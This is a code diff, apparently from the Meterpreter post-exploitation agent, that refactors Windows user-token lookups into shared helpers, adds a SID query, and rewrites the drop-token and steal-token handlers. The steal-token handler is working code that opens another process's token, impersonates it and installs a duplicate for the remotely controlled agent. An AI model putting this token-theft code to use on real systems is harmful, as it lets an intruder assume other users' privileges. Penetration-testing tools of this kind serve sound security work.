@@ -1,6 +1,8 @@
 #include "precomp.h"
 
-#ifndef _WIN32
+#ifdef _WIN32
+#include <Sddl.h>
+#else
 #include <sys/utsname.h>
 #endif
 
@@ -96,53 +98,137 @@ DWORD request_sys_config_getenv(Remote *remote, Packet *packet)
 	return dwResult;
 }
 
-/*
- * sys_getuid
- * ----------
- *
- * Gets the user information of the user the server is executing as
- */
-DWORD request_sys_config_getuid(Remote *remote, Packet *packet)
-{
-	Packet *response = packet_create_response(packet);
-	DWORD res = ERROR_SUCCESS;
 #ifdef _WIN32
-	CHAR username[512], username_only[512], domainname_only[512];
-	LPVOID TokenUserInfo[4096];
-	HANDLE token;
-	DWORD user_length = sizeof(username_only), domain_length = sizeof(domainname_only);
-	DWORD size = sizeof(username), sid_type = 0, returned_tokinfo_length;
-
-	memset(username, 0, sizeof(username));
-	memset(username_only, 0, sizeof(username_only));
-	memset(domainname_only, 0, sizeof(domainname_only));
+/*
+ * @brief Get the token information for the current thread/process.
+ * @param pTokenUser Buffer to receive the token data.
+ * @param dwBufferSize Size of the buffer that will receive the token data.
+ * @returns Indication of success or failure.
+ */
+DWORD get_user_token(LPVOID pTokenUser, DWORD dwBufferSize)
+{
+	DWORD dwResult = 0;
+	DWORD dwReturnedLength = 0;
+	HANDLE hToken;
 
 	do
 	{
-		if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &token))
+		if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken))
 		{
-			OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token);
+			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+			{
+				BREAK_ON_ERROR("[TOKEN] Failed to get a valid token for thread/process.");
+			}
 		}
 
-		if (!GetTokenInformation(token, TokenUser, TokenUserInfo, 4096, &returned_tokinfo_length))
+		if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwBufferSize, &dwReturnedLength))
 		{
-			res = GetLastError();
+			BREAK_ON_ERROR("[TOKEN] Failed to get token information for thread/process.");
+		}
+
+		dwResult = ERROR_SUCCESS;
+	} while (0);
+
+	return dwResult;
+}
+
+/*
+ * @brief Get the SID of the current process/thread.
+ * @param pRemote Pointer to the \c Remote instance.
+ * @param pRequest Pointer to the \c Request packet.
+ * @returns Indication of success or failure.
+ */
+DWORD request_sys_config_getsid(Remote* pRemote, Packet* pRequest)
+{
+	DWORD dwResult;
+	BYTE tokenUserInfo[4096];
+	LPSTR pSid = NULL;
+	Packet *pResponse = packet_create_response(pRequest);
+
+	do
+	{
+		dwResult = get_user_token(tokenUserInfo, sizeof(tokenUserInfo));
+		if (dwResult != ERROR_SUCCESS)
+		{
+			break;
+		}
+
+		if (!ConvertSidToStringSidA(((TOKEN_USER*)tokenUserInfo)->User.Sid, &pSid))
+		{
+			BREAK_ON_ERROR("[GETSID] Unable to convert current SID to string");
+		}
+
+	} while (0);
+
+	if (pSid != NULL)
+	{
+		packet_add_tlv_string(pResponse, TLV_TYPE_SID, pSid);
+		LocalFree(pSid);
+	}
+
+	packet_transmit_response(dwResult, pRemote, pResponse);
+
+	return dwResult;
+}
+
+/*
+ * @brief Get the UID of the current process/thread.
+ * @param pRequest Pointer to the \c Request packet.
+ * @returns Indication of success or failure.
+ * @remark This is a helper function that does the grunt work
+ *         for getting the user details which is used in a few
+ *         other locations.
+ */
+DWORD populate_uid(Packet* pResponse)
+{
+	DWORD dwResult;
+	CHAR cbUsername[1024], cbUserOnly[512], cbDomainOnly[512];
+	BYTE tokenUserInfo[4096];
+	DWORD dwUserSize = sizeof(cbUserOnly), dwDomainSize = sizeof(cbDomainOnly);
+	DWORD dwSidType = 0;
+
+	memset(cbUsername, 0, sizeof(cbUsername));
+	memset(cbUserOnly, 0, sizeof(cbUserOnly));
+	memset(cbDomainOnly, 0, sizeof(cbDomainOnly));
+
+	do
+	{
+		if ((dwResult = get_user_token(tokenUserInfo, sizeof(tokenUserInfo))) != ERROR_SUCCESS)
+		{
 			break;
 		}
 		
-		if (!LookupAccountSidA(NULL, ((TOKEN_USER*)TokenUserInfo)->User.Sid, username_only, &user_length, domainname_only, &domain_length, (PSID_NAME_USE)&sid_type))
+		if (!LookupAccountSidA(NULL, ((TOKEN_USER*)tokenUserInfo)->User.Sid, cbUserOnly, &dwUserSize, cbDomainOnly, &dwDomainSize, (PSID_NAME_USE)&dwSidType))
 		{
-			res = GetLastError();
-			break;
+			BREAK_ON_ERROR("[GETUID] Failed to lookup the account SID data");
 		}
 
  		// Make full name in DOMAIN\USERNAME format
-		_snprintf(username, 512, "%s\\%s", domainname_only, username_only);
-		username[511] = '\0';
+		_snprintf(cbUsername, 512, "%s\\%s", cbDomainOnly, cbUserOnly);
+		cbUsername[511] = '\0';
 
-		packet_add_tlv_string(response, TLV_TYPE_USER_NAME, username);
+		packet_add_tlv_string(pResponse, TLV_TYPE_USER_NAME, cbUsername);
 
+		dwResult = EXIT_SUCCESS;
 	} while (0);
+
+	return dwResult;
+}
+#endif
+
+/*
+ * @brief Get the user name of the current process/thread.
+ * @param pRemote Pointer to the \c Remote instance.
+ * @param pRequest Pointer to the \c Request packet.
+ * @returns Indication of success or failure.
+ */
+DWORD request_sys_config_getuid(Remote* pRemote, Packet* pPacket)
+{
+	Packet *pResponse = packet_create_response(pPacket);
+	DWORD dwResult = ERROR_SUCCESS;
+
+#ifdef _WIN32
+	dwResult = populate_uid(pResponse);
 #else
 	CHAR info[512];
 	uid_t ru, eu, su;
@@ -154,65 +240,37 @@ DWORD request_sys_config_getuid(Remote *remote, Packet *packet)
 	getresgid(&rg, &eg, &sg);
 
 	snprintf(info, sizeof(info)-1, "uid=%d, gid=%d, euid=%d, egid=%d, suid=%d, sgid=%d", ru, rg, eu, eg, su, sg);
-	packet_add_tlv_string(response, TLV_TYPE_USER_NAME, info);
+	packet_add_tlv_string(pResponse, TLV_TYPE_USER_NAME, info);
 #endif
 
 	// Transmit the response
-	packet_transmit_response(res, remote, response);
+	packet_transmit_response(dwResult, pRemote, pResponse);
 
-	return res;
+	return dwResult;
 }
 
 /*
- * sys_droptoken
- * ----------
- *
- * Drops an existing thread token
+ * @brief Drops an existing thread token.
+ * @param pRemote Pointer to the \c Remote instance.
+ * @param pRequest Pointer to the \c Request packet.
+ * @returns Indication of success or failure.
  */
-DWORD request_sys_config_drop_token(Remote *remote, Packet *packet)
+DWORD request_sys_config_drop_token(Remote* pRemote, Packet* pPacket)
 {
-	Packet *response = packet_create_response(packet);
+	Packet* pResponse = packet_create_response(pPacket);
+	DWORD dwResult = ERROR_SUCCESS;
+
 #ifdef _WIN32
-	DWORD res = ERROR_SUCCESS;
-	CHAR username[512], username_only[512], domainname_only[512];
-	LPVOID TokenUserInfo[4096];
-	DWORD user_length = sizeof(username_only), domain_length = sizeof(domainname_only);
-	DWORD size = sizeof(username), sid_type = 0, returned_tokinfo_length;
-
-	memset(username, 0, sizeof(username));
-	memset(username_only, 0, sizeof(username_only));
-	memset(domainname_only, 0, sizeof(domainname_only));
-
-	do
-	{
-		core_update_thread_token(remote, NULL);
-		
-		if (!GetTokenInformation(remote->hThreadToken, TokenUser, TokenUserInfo, 4096, &returned_tokinfo_length))
-		{
-			res = GetLastError();
-			break;
-		}
-		
-		if (!LookupAccountSidA(NULL, ((TOKEN_USER*)TokenUserInfo)->User.Sid, username_only, &user_length, domainname_only, &domain_length, (PSID_NAME_USE)&sid_type))
-		{
-			res = GetLastError();
-			break;
-		}
-
- 		// Make full name in DOMAIN\USERNAME format
-		_snprintf(username, 512, "%s\\%s", domainname_only, username_only);
-		username[511] = '\0';
-
-		packet_add_tlv_string(response, TLV_TYPE_USER_NAME, username);
-
-	} while (0);
+	core_update_thread_token(pRemote, NULL);
+	dwResult = populate_uid(pResponse);
 #else
-	DWORD res = ERROR_NOT_SUPPORTED;
+	dwResult = ERROR_NOT_SUPPORTED;
 #endif
-	// Transmit the response
-	packet_transmit_response(res, remote, response);
 
-	return res;
+	// Transmit the response
+	packet_transmit_response(dwResult, pRemote, pResponse);
+
+	return dwResult;
 }
 
 /*
@@ -305,94 +363,75 @@ DWORD request_sys_config_getprivs(Remote *remote, Packet *packet)
 DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
 {
 	Packet *response = packet_create_response(packet);
+	DWORD dwResult = ERROR_SUCCESS;
 #ifdef _WIN32
-	DWORD res = ERROR_SUCCESS;
-	CHAR username[512], username_only[512], domainname_only[512];
-	LPVOID TokenUserInfo[4096];
-	HANDLE token = NULL;
-	HANDLE handle = NULL;
-	HANDLE xtoken = NULL;
-	DWORD pid;
-	DWORD user_length = sizeof(username_only), domain_length = sizeof(domainname_only);
-	DWORD size = sizeof(username), sid_type = 0, returned_tokinfo_length;
-
-	memset(username, 0, sizeof(username));
-	memset(username_only, 0, sizeof(username_only));
-	memset(domainname_only, 0, sizeof(domainname_only));
+	HANDLE hToken = NULL;
+	HANDLE hProcessHandle = NULL;
+	HANDLE hDupToken = NULL;
+	DWORD dwPid;
 
 	do
 	{
 		// Get the process identifier that we're attaching to, if any.
-		pid = packet_get_tlv_value_uint(packet, TLV_TYPE_PID);
+		dwPid = packet_get_tlv_value_uint(packet, TLV_TYPE_PID);
 
-		if (!pid) {
-			res = -1;
-			break;
-		}
-
-		handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
-
-		if(!handle) {
-			res = GetLastError();
-			dprintf("[STEAL-TOKEN] Failed to open process handle for %d (%u)", pid, res);
-			break;
-		}
-
-		if(! OpenProcessToken(handle, TOKEN_ALL_ACCESS, &token)){
-			res = GetLastError();
-			dprintf("[STEAL-TOKEN] Failed to open process token for %d (%u)", pid, res);
-			break;
-		}
-
-		if(! ImpersonateLoggedOnUser(token)) {
-			res = GetLastError();
-			dprintf("[STEAL-TOKEN] Failed to impersonate token for %d (%u)", pid, res);
-			break;	
-		}
-
-
-		if(! DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &xtoken)) {
-			res = GetLastError();
-			dprintf("[STEAL-TOKEN] Failed to duplicate a primary token for %d (%u)", pid, res);
-			break;	
-		}
-
-		core_update_thread_token(remote, xtoken);
-
-		if (! GetTokenInformation(token, TokenUser, TokenUserInfo, 4096, &returned_tokinfo_length))
+		if (!dwPid)
 		{
-			res = GetLastError();
-			dprintf("[STEAL-TOKEN] Failed to get token information for %d (%u)", pid, res);
+			dwResult = -1;
 			break;
 		}
-		
-		if (!LookupAccountSidA(NULL, ((TOKEN_USER*)TokenUserInfo)->User.Sid, username_only, &user_length, domainname_only, &domain_length, (PSID_NAME_USE)&sid_type))
+
+		hProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid);
+
+		if (!hProcessHandle)
 		{
-			res = GetLastError();
-			dprintf("[STEAL-TOKEN] Failed to lookup sid for %d (%u)", pid, res);
+			dwResult = GetLastError();
+			dprintf("[STEAL-TOKEN] Failed to open process handle for %d (%u)", dwPid, dwResult);
 			break;
 		}
 
- 		// Make full name in DOMAIN\USERNAME format
-		_snprintf(username, 512, "%s\\%s", domainname_only, username_only);
-		username[511] = '\0';
+		if (!OpenProcessToken(hProcessHandle, TOKEN_ALL_ACCESS, &hToken))
+		{
+			dwResult = GetLastError();
+			dprintf("[STEAL-TOKEN] Failed to open process token for %d (%u)", dwPid, dwResult);
+			break;
+		}
 
-		packet_add_tlv_string(response, TLV_TYPE_USER_NAME, username);
+		if (!ImpersonateLoggedOnUser(hToken))
+		{
+			dwResult = GetLastError();
+			dprintf("[STEAL-TOKEN] Failed to impersonate token for %d (%u)", dwPid, dwResult);
+			break;
+		}
 
+		if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDupToken))
+		{
+			dwResult = GetLastError();
+			dprintf("[STEAL-TOKEN] Failed to duplicate a primary token for %d (%u)", dwPid, dwResult);
+			break;
+		}
+
+		core_update_thread_token(remote, hDupToken);
+
+		dwResult = populate_uid(response);
 	} while (0);
 
-	if(handle)
-		CloseHandle(handle);
-	
-	if(token)
-		CloseHandle(token);
+	if (hProcessHandle)
+	{
+		CloseHandle(hProcessHandle);
+	}
+
+	if (hToken)
+	{
+		CloseHandle(hToken);
+	}
 #else
-	DWORD res = ERROR_NOT_SUPPORTED;
+	dwResult = ERROR_NOT_SUPPORTED;
 #endif
 	// Transmit the response
-	packet_transmit_response(res, remote, response);
+	packet_transmit_response(dwResult, remote, response);
 
-	return res;
+	return dwResult;
 }
 
 /*
